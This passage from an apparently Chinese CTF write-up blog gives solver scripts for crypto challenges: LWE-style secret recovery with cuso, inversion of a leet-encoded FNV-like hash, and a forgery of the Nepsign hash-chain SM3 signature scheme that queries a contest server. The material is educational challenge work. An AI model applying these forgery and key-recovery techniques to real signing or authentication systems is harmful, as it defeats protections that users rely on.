over. Provide the encryption key, and you shall be granted the mercy of a swift end. Refuse, and your death will be prolonged.&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)) == secret</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Do you really think I would let you go? <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>题目大意是给出了A,B，并且e∈(-3,3),并且我们一共有50组式子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = (<span class="built_in">sum</span>(A[time][j][(secret &gt;&gt; j) &amp; <span class="number">1</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))+e[time])%p</span><br></pre></td></tr></table></figure>

<p>提一嘴这里的(secret &gt;&gt; j) &amp; 1指的就是secret的第j位(先把第j位挪到最右边，然后保留最后一位，其他位全部清零)，然后我们根据这个比特选择 <code>A[time][j][0]</code> 或<code>A[time][j][1]</code>。对于这个选择我们仍然可以用数学式子来表示。</p>
<ul>
<li><p>假设 x[j]∈{0,1}，即 secret 的第 j 位。</p>
</li>
<li><p>那么：</p>
<ul>
<li><p>如果 x[j]&#x3D;0：</p>
<p><code>At[j][0]</code>⋅(1−0)+<code>At[j][1]</code>⋅0&#x3D;<code>At[j][0]</code></p>
</li>
<li><p>如果 x[j]&#x3D;1x[j] &#x3D; 1x[j]&#x3D;1：</p>
<p><code>At[j][0]</code>⋅(1−1)+<code>At[j][1]</code>⋅1&#x3D;<code>At[j][1]</code></p>
</li>
</ul>
</li>
</ul>
<p>所以这一项等价于：</p>
<p><code>At[j][(x[j])</code></p>
<p>然后我们就可以cuso一把梭(笑)，大致讲一下cuso的用法，就是利用relations，bounds，modulus这三个已知量就能求对应的smallroots了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> cuso</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">io = process([<span class="string">&#x27;python gui.py&#x27;</span>], shell=<span class="literal">True</span>)</span><br><span class="line">p = <span class="number">257</span></span><br><span class="line">n = <span class="number">36</span></span><br><span class="line">m = <span class="number">50</span></span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">1337</span>))</span><br><span class="line"></span><br><span class="line">A = [[[random.randrange(p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">line = io.recvline()</span><br><span class="line">parts = line.split(<span class="string">b&#x27;: &#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;无法解析 B 数据，收到: <span class="subst">&#123;line!r&#125;</span>&quot;</span>)</span><br><span class="line">B = <span class="built_in">eval</span>(parts[<span class="number">1</span>].decode().strip())</span><br><span class="line"><span class="built_in">vars</span> = var(<span class="string">&#x27;,&#x27;</span>.join([<span class="string">f&#x27;x<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]))</span><br><span class="line">es = var(<span class="string">&#x27;,&#x27;</span>.join([<span class="string">f&#x27;e<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]))</span><br><span class="line">bounds = &#123;<span class="built_in">vars</span>[i]: (-<span class="number">1</span>, <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)&#125;</span><br><span class="line">bounds.update(&#123;es[i]: (-<span class="number">4</span>, <span class="number">5</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)&#125;)</span><br><span class="line">relations = []</span><br><span class="line"><span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    equation = <span class="built_in">sum</span>(A[time][j][<span class="number">0</span>] * (<span class="number">1</span> - <span class="built_in">vars</span>[j]) + A[time][j][<span class="number">1</span>] * <span class="built_in">vars</span>[j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)) + es[time] - B[time]</span><br><span class="line">    relations.append(equation)</span><br><span class="line">roots = cuso.find_small_roots(relations, bounds, modulus=p)[<span class="number">0</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(roots[<span class="built_in">eval</span>(<span class="string">f&#x27;x<span class="subst">&#123;_&#125;</span>&#x27;</span>)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])[::-<span class="number">1</span>]</span><br><span class="line">secret = <span class="built_in">int</span>(res, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;computed secret:&quot;</span>, secret)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(secret).encode())</span><br><span class="line">flag = io.recvline()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="LeetSpe4k"><a href="#LeetSpe4k" class="headerlink" title="LeetSpe4k"></a>LeetSpe4k</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">le4t = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join(choice(<span class="built_in">next</span>((j <span class="keyword">for</span> j <span class="keyword">in</span> [<span class="string">&#x27;a@4A&#x27;</span>, <span class="string">&#x27;b8B&#x27;</span>, <span class="string">&#x27;cC&#x27;</span>, <span class="string">&#x27;dD&#x27;</span>, <span class="string">&#x27;e3E&#x27;</span>, <span class="string">&#x27;fF&#x27;</span>, <span class="string">&#x27;g9G&#x27;</span>, <span class="string">&#x27;hH&#x27;</span>, <span class="string">&#x27;iI&#x27;</span>, <span class="string">&#x27;jJ&#x27;</span>, <span class="string">&#x27;kK&#x27;</span>, <span class="string">&#x27;l1L&#x27;</span>, <span class="string">&#x27;mM&#x27;</span>, <span class="string">&#x27;nN&#x27;</span>, <span class="string">&#x27;o0O&#x27;</span>, <span class="string">&#x27;pP&#x27;</span>, <span class="string">&#x27;qQ&#x27;</span>, <span class="string">&#x27;rR&#x27;</span>, <span class="string">&#x27;s$5S&#x27;</span>, <span class="string">&#x27;t7T&#x27;</span>, <span class="string">&#x27;uU&#x27;</span>, <span class="string">&#x27;vV&#x27;</span>, <span class="string">&#x27;wW&#x27;</span>, <span class="string">&#x27;xX&#x27;</span>, <span class="string">&#x27;yY&#x27;</span>, <span class="string">&#x27;z2Z&#x27;</span>] <span class="keyword">if</span> i <span class="keyword">in</span> j), i)) <span class="keyword">for</span> i <span class="keyword">in</span> x.decode())</span><br><span class="line">h4sH = <span class="keyword">lambda</span> x: reduce(<span class="keyword">lambda</span> acc, i: ((acc * (<span class="number">2</span>**<span class="number">255</span>+<span class="number">95</span>)) % <span class="number">2</span>**<span class="number">256</span>) + i, x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(le4t(flag), h4sH(flag))</span><br><span class="line"><span class="comment">#nSsCtf&#123;H@pPy_A7h_4nNiv3R$arY_ns$C7F_@nD_l3t$_d0_7h3_LllE3t$pEAk!&#125; 9114319649335272435156391225321827082199770146054215376559826851511551461403</span></span><br></pre></td></tr></table></figure>

<p>很有鸡块风格的代码。</p>
<p>看到h4sH就想到可能是fnv的题，这类题在去年ciscn，今年miniL和d3CTF好像都出现过。</p>
<p>那么直接就有这个式子<img src="https://ooo.0x0.ooo/2025/09/09/OlvZcx.png" alt="OlvZcx.png"></p>
<p>不过这里涉及到一个小技巧，学习了N1gh7ma12e师傅的博客[NSS 4th | N1gh7ma12e的小站](<a href="http://n1gh7ma12e.cn/2025/08/25/NSS">http://n1gh7ma12e.cn/2025/08/25/NSS</a> 4th&#x2F;)我们需要将“选择”看作一个式子。</p>
<p>比如把<code>a</code>替换成<code>@</code>可以写成(0,1,0,0)$*$(a,@,4,A)$^{T}$</p>
<p>这次咱就不用老办法，来试试科技，继续尝试cuso一把梭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cuso</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">TABLE = [</span><br><span class="line">    <span class="string">&#x27;a@4A&#x27;</span>, <span class="string">&#x27;b8B&#x27;</span>, <span class="string">&#x27;cC&#x27;</span>, <span class="string">&#x27;dD&#x27;</span>, <span class="string">&#x27;e3E&#x27;</span>, <span class="string">&#x27;fF&#x27;</span>, <span class="string">&#x27;g9G&#x27;</span>, <span class="string">&#x27;hH&#x27;</span>, <span class="string">&#x27;iI&#x27;</span>, <span class="string">&#x27;jJ&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;kK&#x27;</span>, <span class="string">&#x27;l1L&#x27;</span>, <span class="string">&#x27;mM&#x27;</span>, <span class="string">&#x27;nN&#x27;</span>, <span class="string">&#x27;o0O&#x27;</span>, <span class="string">&#x27;pP&#x27;</span>, <span class="string">&#x27;qQ&#x27;</span>, <span class="string">&#x27;rR&#x27;</span>, <span class="string">&#x27;s$5S&#x27;</span>, <span class="string">&#x27;t7T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uU&#x27;</span>, <span class="string">&#x27;vV&#x27;</span>, <span class="string">&#x27;wW&#x27;</span>, <span class="string">&#x27;xX&#x27;</span>, <span class="string">&#x27;yY&#x27;</span>, <span class="string">&#x27;z2Z&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h4sH = <span class="keyword">lambda</span> x: reduce(<span class="keyword">lambda</span> acc, i: ((acc * (<span class="number">2</span>**<span class="number">255</span> + <span class="number">95</span>)) % <span class="number">2</span>**<span class="number">256</span>) + i, x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leet_flag = <span class="string">&#x27;&#123;H@pPy_A7h_4nNiv3R$arY_ns$C7F_@nD_l3t$_d0_7h3_LllE3t$pEAk!&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">2</span>**<span class="number">255</span> + <span class="number">95</span></span><br><span class="line">p = <span class="number">2</span>**<span class="number">256</span></span><br><span class="line"></span><br><span class="line">flag_example = <span class="string">&#x27;NSSCTF&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">    [c <span class="keyword">if</span> c <span class="keyword">in</span> &#123;<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;!&#x27;</span>&#125; <span class="keyword">else</span> <span class="string">&#x27;\x00&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> leet_flag]</span><br><span class="line">)</span><br><span class="line">flag_example = flag_example.encode()</span><br><span class="line"></span><br><span class="line">target_hash = <span class="number">9114319649335272435156391225321827082199770146054215376559826851511551461403</span></span><br><span class="line">target_hash -= h4sH(flag_example)</span><br><span class="line"></span><br><span class="line">var_groups = []</span><br><span class="line">leet_index = []</span><br><span class="line"></span><br><span class="line">pos = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> leet_flag:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> &#123;<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;!&#x27;</span>&#125;:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> group <span class="keyword">in</span> TABLE:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> group:</span><br><span class="line">            group_vars = var([<span class="string">f&quot;x_<span class="subst">&#123;pos&#125;</span>_<span class="subst">&#123;j&#125;</span>&quot;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(group))])</span><br><span class="line">            var_groups.append(group_vars)</span><br><span class="line">            leet_index.append(TABLE.index(group))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">equations = []</span><br><span class="line">bit_equations = []</span><br><span class="line">bounds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">pos = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(flag_example):</span><br><span class="line">    <span class="keyword">if</span> b:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    pos += <span class="number">1</span></span><br><span class="line">    group = TABLE[leet_index[pos]]</span><br><span class="line">    group_vars = var_groups[pos]</span><br><span class="line">    s = <span class="built_in">sum</span>(group_vars[j] * <span class="built_in">ord</span>(group[j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(group)))</span><br><span class="line">    weight = <span class="built_in">pow</span>(g, <span class="built_in">len</span>(flag_example) - i - <span class="number">1</span>, p)</span><br><span class="line">    equations.append(s * weight)</span><br><span class="line">    bit_equations.append(<span class="built_in">sum</span>(group_vars) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> group_vars:</span><br><span class="line">        bounds[v] = (-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_equation = <span class="built_in">sum</span>(equations) - target_hash</span><br><span class="line">relations = [main_equation] + bit_equations</span><br><span class="line"></span><br><span class="line">solution = cuso.find_small_roots(relations, bounds=bounds, modulus=p)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">pos = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> flag_example:</span><br><span class="line">    <span class="keyword">if</span> b:</span><br><span class="line">        flag += <span class="built_in">chr</span>(b)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    pos += <span class="number">1</span></span><br><span class="line">    group = TABLE[leet_index[pos]]</span><br><span class="line">    group_vars = var_groups[pos]</span><br><span class="line">    <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(group_vars):</span><br><span class="line">        <span class="keyword">if</span> solution[v] == <span class="number">1</span>:</span><br><span class="line">            flag += group[j]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还是大概解释一下这个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var_groups = []</span><br><span class="line">leet_index = []</span><br><span class="line"></span><br><span class="line">pos = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> leet_flag:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> &#123;<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;!&#x27;</span>&#125;:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> group <span class="keyword">in</span> TABLE:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> group:</span><br><span class="line">            group_vars = var([<span class="string">f&quot;x_<span class="subst">&#123;pos&#125;</span>_<span class="subst">&#123;j&#125;</span>&quot;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(group))])</span><br><span class="line">            var_groups.append(group_vars)</span><br><span class="line">            leet_index.append(TABLE.index(group))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这一段的作用是构造方程的约束。</p>
<p>遍历 <code>flag</code> 模板里的字符：</p>
<ul>
<li>如果是 <code>&#123; &#125; _ !</code>，跳过（因为这些确定了）。</li>
<li>否则，找到它在 <code>table</code> 里的对应分组，比如 <code>&#39;a@4A&#39;</code>。</li>
<li>给这个字符创建一组 <strong>0&#x2F;1 变量</strong>，如 <code>x_5_0, x_5_1, x_5_2, x_5_3</code>，代表在 <code>&#39;a@4A&#39;</code> 里选哪一个。</li>
<li>这些变量保证最终只会选一个候选字符</li>
</ul>
<p>然后直接构造方程。最后通过解出来的一组变量赋值，找到哪个变量为1，从对应的table里选取字符，拼接得到完整的flag。</p>
<h1 id="HiddenOracle"><a href="#HiddenOracle" class="headerlink" title="HiddenOracle"></a>HiddenOracle</h1><p>咕咕</p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>NepCTF2025</title>
    <url>/2025/08/02/NepCTF2025/</url>
    <content><![CDATA[<p>QAQ</p>
<p>久违的更新，放假后杂七杂八的事情蛮多一直拖到现在</p>
<span id="more"></span>

<h1 id="Nepsign"><a href="#Nepsign" class="headerlink" title="Nepsign"></a>Nepsign</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):s</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Nepsign</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.n = <span class="number">256</span></span><br><span class="line">        self.hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">        self.keygen()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">self</span>):</span><br><span class="line">        rng = SystemRandom()</span><br><span class="line">        self.sk = [rng.randbytes(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        self.pk = [SM3_n(self.sk[_], <span class="number">255</span>, self.n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        <span class="keyword">return</span> self.sk, self.pk</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, sk=<span class="literal">None</span></span>):</span><br><span class="line">        sk = sk <span class="keyword">if</span> sk <span class="keyword">else</span> self.sk</span><br><span class="line">        m = SM3(msg)</span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)]</span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span>;</span><br><span class="line">        qq = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            qq[i] = SM3_n(sk[i], step[i])</span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]:</span><br><span class="line">                    <span class="built_in">sum</span>[i] += j</span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">            qq[i + <span class="number">32</span>] = SM3_n(sk[i + <span class="number">32</span>], step[i + <span class="number">32</span>])</span><br><span class="line">        <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> qq]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, qq, pk=<span class="literal">None</span></span>):</span><br><span class="line">        qq = [<span class="built_in">bytes</span>.fromhex(i) <span class="keyword">for</span> i <span class="keyword">in</span> qq]</span><br><span class="line">        pk = pk <span class="keyword">if</span> pk <span class="keyword">else</span> self.pk</span><br><span class="line">        m = SM3(msg)</span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)]</span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span>;</span><br><span class="line">        pk_ = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            pk_[i] = SM3_n(qq[i], <span class="number">255</span> - step[i])</span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]:</span><br><span class="line">                    <span class="built_in">sum</span>[i] += j</span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">            pk_[i + <span class="number">32</span>] = SM3_n(qq[i + <span class="number">32</span>], <span class="number">255</span> - step[i + <span class="number">32</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pk_ == pk <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;initializing...&#x27;</span>)</span><br><span class="line">Sign = Nepsign()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)):</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            msg = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;msg: &#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> msg != <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(Sign.sign(msg))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t do that&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            qq = literal_eval(<span class="built_in">input</span>(<span class="string">&#x27;give me a qq: &#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> Sign.verify(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>, qq):</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>唉被ai打爆的一题。</p>
<p>分析代码不难看出是一个基于哈希链上的签名，我们可以通过任意次输入明文得到对应签名，要求给出规定明文的签名来得到flag。</p>
<p>这道题的攻击方式基于哈希链的一个特点-“可追赶”性质。</p>
<p>由于哈希链是<strong>顺序累积</strong>的，有如下性质：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SM3_n(SM3_n(sk[i], s), t) = SM3_n(sk[i], s + t)</span><br></pre></td></tr></table></figure>

<p>已知<code>sigma_obs[i] = SM3_n(sk[i], MIN_STEP[i])</code>，想得到<code>SM3_n(sk[i], target_step[i])</code>，只需再做<code>target_step[i] - MIN_STEP[i]</code>次哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SM3_n(sigma_obs[i], target_step[i] - MIN_STEP[i])</span><br><span class="line">= SM3_n(SM3_n(sk[i], MIN_STEP[i]), target_step[i] - MIN_STEP[i])</span><br><span class="line">= SM3_n(sk[i], MIN_STEP[i] + (target_step[i] - MIN_STEP[i]))</span><br><span class="line">= SM3_n(sk[i], target_step[i])</span><br><span class="line">= sigma_target[i]</span><br></pre></td></tr></table></figure>

<p>所以思路就很清晰了，我们输入随机生成的32字节的消息。然后得到对应签名。通过签名函数中计算step的部分计算该消息的step。这里我们把它单独提出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">steps_from_msg</span>(<span class="params">msg: <span class="built_in">bytes</span></span>):</span><br><span class="line">    h = SM3(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(h, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    step = a + [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(h, <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> ch == HEX[i]:</span><br><span class="line">                s += j</span><br><span class="line">        step[<span class="number">32</span> + i] = s % <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> step</span><br></pre></td></tr></table></figure>

<p>检查每个分量，如果这次新采集到的步数比历史最小步数还小，则更新最小步数和签名。如果所有分量的最小步数都≤目标消息的step[i]。因为只有拥有比目标步数小的签名，才能通过继续哈希“追赶”到目标步数。然后根据之前讲到的性质对每个分量进行(target_step[i] - MIN_STEP[i])次SM3哈希即可。(也可以利用相同位置产生相同签名来进行碰撞)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;warning&#x27;</span></span><br><span class="line">HOST, PORT = <span class="string">&#x27;nepctf30-yb67-wgkm-f37g-75ppqjxnr857.nepctf.com&#x27;</span>, <span class="number">443</span></span><br><span class="line"></span><br><span class="line">target_msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line">HEX = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> sm3.sm3_hash(<span class="built_in">list</span>(data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">steps_from_msg</span>(<span class="params">msg: <span class="built_in">bytes</span></span>):</span><br><span class="line">    h = SM3(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(h, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span 